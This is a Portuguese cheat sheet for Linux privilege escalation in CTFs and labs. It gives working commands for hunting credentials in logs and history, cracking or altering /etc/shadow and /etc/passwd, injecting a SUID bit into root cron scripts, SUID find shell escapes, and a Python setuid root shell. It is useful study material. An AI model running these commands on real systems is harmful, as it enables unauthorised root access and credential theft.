Linux Privilege Escalation — cheat sheet

Guia rápido para escalonamento de privilégios em Linux, focado em enumeração manual e exploração de vetores comuns encontrados em CTFs e ambientes reais.

// disclaimer
Conteúdo criado exclusivamente para fins educacionais e de estudo em offensive security. Usar estas técnicas em sistemas sem autorização prévia é ilegal. Consolidado durante workshops e laboratórios práticos como guia de consulta rápida.

1. Enumeração de sistema & ambiente

O primeiro passo é entender onde você está e o que o usuário atual andou fazendo.

Informações do sistema

uname -a                # Kernel, arquitetura e versão do SO
cat /etc/os-release     # Detalhes da distribuição

Histórico de comandos

cat ~/.bash_history     # Pode conter senhas digitadas ou caminhos sensíveis

Serviços internos

Identificar serviços rodando apenas localmente — podem ser vetores de escalonamento.

ss -tlnp                # Lista portas e serviços ativos

2. Busca de arquivos e segredos

Use find e grep para localizar configuração, backups ou credenciais expostas.

Comando find

# Busca por nome ignorando maiúsculas/minúsculas
find / -name "*flag*" -type f 2>/dev/null

# Busca por extensões sensíveis (.env, .conf, .bak)
find / -name "*.env" -o -name "*.conf" -o -name "*.bak" -type f 2>/dev/null

# Filtrar por diretório específico (ex: /opt)
find /opt -name "config.txt" -type f

Comando grep

# Buscar palavras-chave no diretório de logs de forma recursiva
grep -iEr "password|token|secret|cred" /var/log/ 2>/dev/null

# Analisar logs de acesso web por padrões específicos
grep -iE "robots|token|password|secret|cred" access.log

3. Permissões de arquivos e credenciais

Entender as permissões Linux (rwx) é fundamental para identificar falhas de segurança.

Arquivos críticos — verifique se arquivos sensíveis têm permissões de leitura/escrita indevidas:

ls -la /etc/shadow      # Se tiver leitura, dá pra tentar crackear os hashes
ls -la /etc/passwd      # Se tiver escrita, dá pra criar um usuário root

Movimentação lateral — senhas encontradas em .env / .bak costumam ser reutilizadas por outro usuário ou pelo root:

su <usuario>            # Tente trocar de usuário com as senhas encontradas

4. Agendamento de tarefas (cron jobs)

Tarefas que rodam automaticamente como root são vetores críticos.

cat /etc/crontab

Vetor de ataque: se um script executado pelo cron for editável pelo seu usuário, dá pra injetar comandos para ganhar shell de root ou alterar permissões.

Exemplo de injeção: echo "chmod +s /bin/bash" >> /caminho/do/script.sh

5. Binários SUID (Set User ID)

Arquivos com o bit SUID permitem executar com os privilégios do dono (geralmente root).

# Encontrar binários SUID
find / -perm -u+s -type f 2>/dev/null

Exploração via GTFOBins: encontrando um binário incomum ou um utilitário conhecido (find, cp, vim), consulte o GTFOBins.

# Exemplo — se o find tiver SUID
./find . -exec /bin/sh -p \; -quit

6. Linux capabilities

Capabilities dividem os privilégios do root em pequenos pedaços, permitindo que binários executem funções específicas sem serem totalmente root.

# Listar capabilities de arquivos
getcap -r / 2>/dev/null

# Exemplo de exploração (Python)
python3 -c "import os; os.setuid(0); os.execl('/bin/bash', '/bin/sh')"

7. Dicas de pós-exploração

# Melhorar a shell (upgrade TTY)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Verificar SUDO — o que seu usuário pode rodar como sudo
sudo -l
